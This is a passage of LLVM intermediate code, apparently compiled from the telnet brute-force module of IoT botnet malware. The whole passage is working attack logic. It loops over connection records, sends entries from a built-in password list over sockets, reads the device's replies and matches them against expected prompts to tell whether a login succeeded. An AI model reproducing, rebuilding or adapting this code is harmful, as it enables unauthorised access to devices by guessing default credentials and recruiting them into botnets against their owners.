  %1094 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %1093
  %1095 = load i8*, i8** %1094, align 8
  %1096 = load i32, i32* %2, align 4
  %1097 = sext i32 %1096 to i64
  %1098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1097
  %1099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1098, i32 0, i32 5
  %1100 = load i8, i8* %1099, align 1
  %1101 = zext i8 %1100 to i64
  %1102 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %1101
  %1103 = load i8*, i8** %1102, align 8
  %1104 = call i64 @strlen(i8* noundef %1103) #11
  %1105 = call i64 @send(i32 noundef %1087, i8* noundef %1095, i64 noundef %1104, i32 noundef 16384)
  %1106 = icmp slt i64 %1105, 0
  br i1 %1106, label %1107, label %1122

1107:                                             ; preds = %1082
  %1108 = load i32, i32* %2, align 4
  %1109 = sext i32 %1108 to i64
  %1110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1109
  %1111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1110, i32 0, i32 0
  %1112 = load i32, i32* %1111, align 16
  %1113 = call i32 @sclose(i32 noundef %1112)
  %1114 = load i32, i32* %2, align 4
  %1115 = sext i32 %1114 to i64
  %1116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1115
  %1117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1116, i32 0, i32 2
  store i8 0, i8* %1117, align 8
  %1118 = load i32, i32* %2, align 4
  %1119 = sext i32 %1118 to i64
  %1120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1119
  %1121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1120, i32 0, i32 3
  store i8 1, i8* %1121, align 1
  br label %2054

1122:                                             ; preds = %1082
  %1123 = load i32, i32* %2, align 4
  %1124 = sext i32 %1123 to i64
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1124
  %1126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1125, i32 0, i32 0
  %1127 = load i32, i32* %1126, align 16
  %1128 = call i64 @send(i32 noundef %1127, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  %1129 = icmp slt i64 %1128, 0
  br i1 %1129, label %1130, label %1145

1130:                                             ; preds = %1122
  %1131 = load i32, i32* %2, align 4
  %1132 = sext i32 %1131 to i64
  %1133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1132
  %1134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1133, i32 0, i32 0
  %1135 = load i32, i32* %1134, align 16
  %1136 = call i32 @sclose(i32 noundef %1135)
  %1137 = load i32, i32* %2, align 4
  %1138 = sext i32 %1137 to i64
  %1139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1138
  %1140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1139, i32 0, i32 2
  store i8 0, i8* %1140, align 8
  %1141 = load i32, i32* %2, align 4
  %1142 = sext i32 %1141 to i64
  %1143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1142
  %1144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1143, i32 0, i32 3
  store i8 1, i8* %1144, align 1
  br label %2054

1145:                                             ; preds = %1122
  %1146 = load i32, i32* %2, align 4
  %1147 = sext i32 %1146 to i64
  %1148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1147
  %1149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1148, i32 0, i32 2
  store i8 6, i8* %1149, align 8
  br label %2053

1150:                                             ; preds = %69
  %1151 = load i32, i32* %2, align 4
  %1152 = sext i32 %1151 to i64
  %1153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1152
  %1154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1153, i32 0, i32 6
  %1155 = load i32, i32* %1154, align 4
  %1156 = icmp eq i32 %1155, 0
  br i1 %1156, label %1157, label %1163

1157:                                             ; preds = %1150
  %1158 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %1159 = load i32, i32* %2, align 4
  %1160 = sext i32 %1159 to i64
  %1161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1160
  %1162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1161, i32 0, i32 6
  store i32 %1158, i32* %1162, align 4
  br label %1163

1163:                                             ; preds = %1157, %1150
  %1164 = load i32, i32* %2, align 4
  %1165 = sext i32 %1164 to i64
  %1166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1165
  %1167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1166, i32 0, i32 0
  %1168 = load i32, i32* %1167, align 16
  %1169 = load i32, i32* %2, align 4
  %1170 = sext i32 %1169 to i64
  %1171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1170
  %1172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1171, i32 0, i32 8
  %1173 = load i8*, i8** %1172, align 8
  %1174 = load i32, i32* %2, align 4
  %1175 = sext i32 %1174 to i64
  %1176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1175
  %1177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1176, i32 0, i32 7
  %1178 = load i16, i16* %1177, align 16
  %1179 = zext i16 %1178 to i32
  %1180 = call i32 @readUntil(i32 noundef %1168, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %1173, i32 noundef 1024, i32 noundef %1179)
  %1181 = icmp ne i32 %1180, 0
  br i1 %1181, label %1182, label %1257

1182:                                             ; preds = %1163
  %1183 = load i32, i32* %2, align 4
  %1184 = sext i32 %1183 to i64
  %1185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1184
  %1186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1185, i32 0, i32 6
  store i32 0, i32* %1186, align 4
  %1187 = load i32, i32* %2, align 4
  %1188 = sext i32 %1187 to i64
  %1189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1188
  %1190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1189, i32 0, i32 7
  store i16 0, i16* %1190, align 16
  %1191 = load i32, i32* %2, align 4
  %1192 = sext i32 %1191 to i64
  %1193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1192
  %1194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1193, i32 0, i32 8
  %1195 = load i8*, i8** %1194, align 8
  %1196 = call i8* @strstr(i8* noundef %1195, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0)) #11
  %1197 = icmp ne i8* %1196, null
  br i1 %1197, label %1198, label %1218

1198:                                             ; preds = %1182
  %1199 = load i32, i32* %2, align 4
  %1200 = sext i32 %1199 to i64
  %1201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1200
  %1202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1201, i32 0, i32 8
  %1203 = load i8*, i8** %1202, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1203, i8 0, i64 1024, i1 false)
  %1204 = load i32, i32* %2, align 4
  %1205 = sext i32 %1204 to i64
  %1206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1205
  %1207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1206, i32 0, i32 0
  %1208 = load i32, i32* %1207, align 16
  %1209 = call i32 @sclose(i32 noundef %1208)
  %1210 = load i32, i32* %2, align 4
  %1211 = sext i32 %1210 to i64
  %1212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1211
  %1213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1212, i32 0, i32 2
  store i8 0, i8* %1213, align 8
  %1214 = load i32, i32* %2, align 4
  %1215 = sext i32 %1214 to i64
  %1216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1215
  %1217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1216, i32 0, i32 3
  store i8 0, i8* %1217, align 1
  br label %2054

1218:                                             ; preds = %1182
  %1219 = load i32, i32* %2, align 4
  %1220 = sext i32 %1219 to i64
  %1221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1220
  %1222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1221, i32 0, i32 8
  %1223 = load i8*, i8** %1222, align 8
  %1224 = call i32 @matchPrompt(i8* noundef %1223)
  %1225 = icmp ne i32 %1224, 0
  br i1 %1225, label %1246, label %1226

1226:                                             ; preds = %1218
  %1227 = load i32, i32* %2, align 4
  %1228 = sext i32 %1227 to i64
  %1229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1228
  %1230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1229, i32 0, i32 8
  %1231 = load i8*, i8** %1230, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1231, i8 0, i64 1024, i1 false)
  %1232 = load i32, i32* %2, align 4
  %1233 = sext i32 %1232 to i64
  %1234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1233
  %1235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1234, i32 0, i32 0
  %1236 = load i32, i32* %1235, align 16
  %1237 = call i32 @sclose(i32 noundef %1236)
  %1238 = load i32, i32* %2, align 4
  %1239 = sext i32 %1238 to i64
  %1240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1239
  %1241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1240, i32 0, i32 2
  store i8 0, i8* %1241, align 8
  %1242 = load i32, i32* %2, align 4
  %1243 = sext i32 %1242 to i64
  %1244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1243
  %1245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1244, i32 0, i32 3
  store i8 1, i8* %1245, align 1
  br label %2054

1246:                                             ; preds = %1218
  %1247 = load i32, i32* %2, align 4
  %1248 = sext i32 %1247 to i64
  %1249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1248
  %1250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1249, i32 0, i32 2
  store i8 7, i8* %1250, align 8
  br label %1251

1251:                                             ; preds = %1246
  %1252 = load i32, i32* %2, align 4
  %1253 = sext i32 %1252 to i64
  %1254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1253
  %1255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1254, i32 0, i32 8
  %1256 = load i8*, i8** %1255, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1256, i8 0, i64 1024, i1 false)
  br label %2054

1257:                                             ; preds = %1163
  %1258 = load i32, i32* %2, align 4
  %1259 = sext i32 %1258 to i64
  %1260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1259
  %1261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1260, i32 0, i32 0
  %1262 = load i32, i32* %1261, align 16
  %1263 = load i32, i32* %2, align 4
  %1264 = sext i32 %1263 to i64
  %1265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1264
  %1266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1265, i32 0, i32 8
  %1267 = load i8*, i8** %1266, align 8
  %1268 = load i32, i32* %2, align 4
  %1269 = sext i32 %1268 to i64
  %1270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1269
  %1271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1270, i32 0, i32 7
  %1272 = load i16, i16* %1271, align 16
  %1273 = zext i16 %1272 to i32
  %1274 = call i32 @readUntil(i32 noundef %1262, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %1267, i32 noundef 1024, i32 noundef %1273)
  %1275 = icmp ne i32 %1274, 0
  br i1 %1275, label %1276, label %1351

1276:                                             ; preds = %1257
  %1277 = load i32, i32* %2, align 4
  %1278 = sext i32 %1277 to i64
  %1279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1278
  %1280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1279, i32 0, i32 6
  store i32 0, i32* %1280, align 4
  %1281 = load i32, i32* %2, align 4
  %1282 = sext i32 %1281 to i64
  %1283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1282
  %1284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1283, i32 0, i32 7
  store i16 0, i16* %1284, align 16
  %1285 = load i32, i32* %2, align 4
  %1286 = sext i32 %1285 to i64
  %1287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1286
  %1288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1287, i32 0, i32 8
  %1289 = load i8*, i8** %1288, align 8
  %1290 = call i8* @strstr(i8* noundef %1289, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0)) #11
  %1291 = icmp ne i8* %1290, null
  br i1 %1291, label %1292, label %1312

1292:                                             ; preds = %1276
  %1293 = load i32, i32* %2, align 4
  %1294 = sext i32 %1293 to i64
  %1295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1294
  %1296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1295, i32 0, i32 8
  %1297 = load i8*, i8** %1296, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1297, i8 0, i64 1024, i1 false)
  %1298 = load i32, i32* %2, align 4
  %1299 = sext i32 %1298 to i64
  %1300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1299
  %1301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1300, i32 0, i32 0
  %1302 = load i32, i32* %1301, align 16
  %1303 = call i32 @sclose(i32 noundef %1302)
  %1304 = load i32, i32* %2, align 4
  %1305 = sext i32 %1304 to i64
  %1306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1305
  %1307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1306, i32 0, i32 2
  store i8 0, i8* %1307, align 8
  %1308 = load i32, i32* %2, align 4
  %1309 = sext i32 %1308 to i64
  %1310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1309
  %1311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1310, i32 0, i32 3
  store i8 0, i8* %1311, align 1
  br label %2054

1312:                                             ; preds = %1276
  %1313 = load i32, i32* %2, align 4
  %1314 = sext i32 %1313 to i64
  %1315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1314
  %1316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1315, i32 0, i32 8
  %1317 = load i8*, i8** %1316, align 8
  %1318 = call i32 @matchPrompt(i8* noundef %1317)
  %1319 = icmp ne i32 %1318, 0
  br i1 %1319, label %1340, label %1320

1320:                                             ; preds = %1312
  %1321 = load i32, i32* %2, align 4
  %1322 = sext i32 %1321 to i64
  %1323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1322
  %1324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1323, i32 0, i32 8
  %1325 = load i8*, i8** %1324, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1325, i8 0, i64 1024, i1 false)
  %1326 = load i32, i32* %2, align 4
  %1327 = sext i32 %1326 to i64
  %1328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1327
  %1329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1328, i32 0, i32 0
  %1330 = load i32, i32* %1329, align 16
  %1331 = call i32 @sclose(i32 noundef %1330)
  %1332 = load i32, i32* %2, align 4
  %1333 = sext i32 %1332 to i64
  %1334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1333
  %1335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1334, i32 0, i32 2
  store i8 0, i8* %1335, align 8
  %1336 = load i32, i32* %2, align 4
  %1337 = sext i32 %1336 to i64
  %1338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1337
  %1339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1338, i32 0, i32 3
  store i8 1, i8* %1339, align 1
  br label %2054

1340:                                             ; preds = %1312
  %1341 = load i32, i32* %2, align 4
  %1342 = sext i32 %1341 to i64
  %1343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1342
  %1344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1343, i32 0, i32 2
  store i8 7, i8* %1344, align 8
  br label %1345

1345:                                             ; preds = %1340
  %1346 = load i32, i32* %2, align 4
  %1347 = sext i32 %1346 to i64
  %1348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1347
  %1349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1348, i32 0, i32 8
  %1350 = load i8*, i8** %1349, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1350, i8 0, i64 1024, i1 false)
  br label %2054

1351:                                             ; preds = %1257
  %1352 = load i32, i32* %2, align 4
  %1353 = sext i32 %1352 to i64
  %1354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1353
  %1355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1354, i32 0, i32 0
  %1356 = load i32, i32* %1355, align 16
  %1357 = load i32, i32* %2, align 4
  %1358 = sext i32 %1357 to i64
  %1359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1358
  %1360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1359, i32 0, i32 8
  %1361 = load i8*, i8** %1360, align 8
  %1362 = load i32, i32* %2, align 4
  %1363 = sext i32 %1362 to i64
  %1364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1363
  %1365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1364, i32 0, i32 7
  %1366 = load i16, i16* %1365, align 16
  %1367 = zext i16 %1366 to i32
  %1368 = call i32 @readUntil(i32 noundef %1356, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %1361, i32 noundef 1024, i32 noundef %1367)
  %1369 = icmp ne i32 %1368, 0
  br i1 %1369, label %1370, label %1445

1370:                                             ; preds = %1351
  %1371 = load i32, i32* %2, align 4
  %1372 = sext i32 %1371 to i64
  %1373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1372
  %1374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1373, i32 0, i32 6
  store i32 0, i32* %1374, align 4
  %1375 = load i32, i32* %2, align 4
  %1376 = sext i32 %1375 to i64
  %1377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1376
  %1378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1377, i32 0, i32 7
  store i16 0, i16* %1378, align 16
  %1379 = load i32, i32* %2, align 4
  %1380 = sext i32 %1379 to i64
  %1381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1380
  %1382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1381, i32 0, i32 8
  %1383 = load i8*, i8** %1382, align 8
  %1384 = call i8* @strstr(i8* noundef %1383, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0)) #11
  %1385 = icmp ne i8* %1384, null
  br i1 %1385, label %1386, label %1406

1386:                                             ; preds = %1370
  %1387 = load i32, i32* %2, align 4
  %1388 = sext i32 %1387 to i64
  %1389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1388
  %1390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1389, i32 0, i32 8
  %1391 = load i8*, i8** %1390, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1391, i8 0, i64 1024, i1 false)
  %1392 = load i32, i32* %2, align 4
  %1393 = sext i32 %1392 to i64
  %1394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1393
  %1395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1394, i32 0, i32 0
  %1396 = load i32, i32* %1395, align 16
  %1397 = call i32 @sclose(i32 noundef %1396)
  %1398 = load i32, i32* %2, align 4
  %1399 = sext i32 %1398 to i64
  %1400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1399
  %1401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1400, i32 0, i32 2
  store i8 0, i8* %1401, align 8
  %1402 = load i32, i32* %2, align 4
  %1403 = sext i32 %1402 to i64
  %1404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1403
  %1405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1404, i32 0, i32 3
  store i8 0, i8* %1405, align 1
  br label %2054

1406:                                             ; preds = %1370
  %1407 = load i32, i32* %2, align 4
  %1408 = sext i32 %1407 to i64
  %1409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1408
  %1410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1409, i32 0, i32 8
  %1411 = load i8*, i8** %1410, align 8
  %1412 = call i32 @matchPrompt(i8* noundef %1411)
  %1413 = icmp ne i32 %1412, 0
  br i1 %1413, label %1434, label %1414

1414:                                             ; preds = %1406
  %1415 = load i32, i32* %2, align 4
  %1416 = sext i32 %1415 to i64
  %1417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1416
  %1418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1417, i32 0, i32 8
  %1419 = load i8*, i8** %1418, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1419, i8 0, i64 1024, i1 false)
  %1420 = load i32, i32* %2, align 4
  %1421 = sext i32 %1420 to i64
  %1422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1421
  %1423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1422, i32 0, i32 0
  %1424 = load i32, i32* %1423, align 16
  %1425 = call i32 @sclose(i32 noundef %1424)
  %1426 = load i32, i32* %2, align 4
  %1427 = sext i32 %1426 to i64
  %1428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1427
  %1429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1428, i32 0, i32 2
  store i8 0, i8* %1429, align 8
  %1430 = load i32, i32* %2, align 4
  %1431 = sext i32 %1430 to i64
  %1432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1431
  %1433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1432, i32 0, i32 3
  store i8 1, i8* %1433, align 1
  br label %2054

1434:                                             ; preds = %1406
  %1435 = load i32, i32* %2, align 4
  %1436 = sext i32 %1435 to i64
  %1437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1436
  %1438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1437, i32 0, i32 2
  store i8 7, i8* %1438, align 8
  br label %1439

1439:                                             ; preds = %1434
  %1440 = load i32, i32* %2, align 4
  %1441 = sext i32 %1440 to i64
  %1442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1441
  %1443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1442, i32 0, i32 8
  %1444 = load i8*, i8** %1443, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1444, i8 0, i64 1024, i1 false)
  br label %2054

1445:                                             ; preds = %1351
  %1446 = load i32, i32* %2, align 4
  %1447 = sext i32 %1446 to i64
  %1448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1447
  %1449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1448, i32 0, i32 0
  %1450 = load i32, i32* %1449, align 16
  %1451 = load i32, i32* %2, align 4
  %1452 = sext i32 %1451 to i64
  %1453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1452
  %1454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1453, i32 0, i32 8
  %1455 = load i8*, i8** %1454, align 8
  %1456 = load i32, i32* %2, align 4
  %1457 = sext i32 %1456 to i64
  %1458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1457
  %1459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1458, i32 0, i32 7
  %1460 = load i16, i16* %1459, align 16
  %1461 = zext i16 %1460 to i32
  %1462 = call i32 @readUntil(i32 noundef %1450, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %1455, i32 noundef 1024, i32 noundef %1461)
  %1463 = icmp ne i32 %1462, 0
  br i1 %1463, label %1464, label %1539

1464:                                             ; preds = %1445
  %1465 = load i32, i32* %2, align 4
  %1466 = sext i32 %1465 to i64
  %1467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1466
  %1468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1467, i32 0, i32 6
  store i32 0, i32* %1468, align 4
  %1469 = load i32, i32* %2, align 4
  %1470 = sext i32 %1469 to i64
  %1471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1470
  %1472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1471, i32 0, i32 7
  store i16 0, i16* %1472, align 16
  %1473 = load i32, i32* %2, align 4
  %1474 = sext i32 %1473 to i64
  %1475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1474
  %1476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1475, i32 0, i32 8
  %1477 = load i8*, i8** %1476, align 8
  %1478 = call i8* @strstr(i8* noundef %1477, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0)) #11
  %1479 = icmp ne i8* %1478, null
  br i1 %1479, label %1480, label %1500

1480:                                             ; preds = %1464
  %1481 = load i32, i32* %2, align 4
  %1482 = sext i32 %1481 to i64
  %1483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1482
  %1484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1483, i32 0, i32 8
  %1485 = load i8*, i8** %1484, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1485, i8 0, i64 1024, i1 false)
  %1486 = load i32, i32* %2, align 4
  %1487 = sext i32 %1486 to i64
  %1488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1487
  %1489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1488, i32 0, i32 0
  %1490 = load i32, i32* %1489, align 16
  %1491 = call i32 @sclose(i32 noundef %1490)
  %1492 = load i32, i32* %2, align 4
  %1493 = sext i32 %1492 to i64
  %1494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1493
  %1495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1494, i32 0, i32 2
  store i8 0, i8* %1495, align 8
  %1496 = load i32, i32* %2, align 4
  %1497 = sext i32 %1496 to i64
  %1498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1497
  %1499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1498, i32 0, i32 3
  store i8 0, i8* %1499, align 1
  br label %2054

1500:                                             ; preds = %1464
  %1501 = load i32, i32* %2, align 4
  %1502 = sext i32 %1501 to i64
  %1503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1502
  %1504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1503, i32 0, i32 8
  %1505 = load i8*, i8** %1504, align 8
  %1506 = call i32 @matchPrompt(i8* noundef %1505)
  %1507 = icmp ne i32 %1506, 0
  br i1 %1507, label %1528, label %1508

1508:                                             ; preds = %1500
  %1509 = load i32, i32* %2, align 4
  %1510 = sext i32 %1509 to i64
  %1511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1510
  %1512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1511, i32 0, i32 8
  %1513 = load i8*, i8** %1512, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1513, i8 0, i64 1024, i1 false)
  %1514 = load i32, i32* %2, align 4
  %1515 = sext i32 %1514 to i64
  %1516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1515
  %1517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1516, i32 0, i32 0
  %1518 = load i32, i32* %1517, align 16
  %1519 = call i32 @sclose(i32 noundef %1518)
  %1520 = load i32, i32* %2, align 4
  %1521 = sext i32 %1520 to i64
  %1522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1521
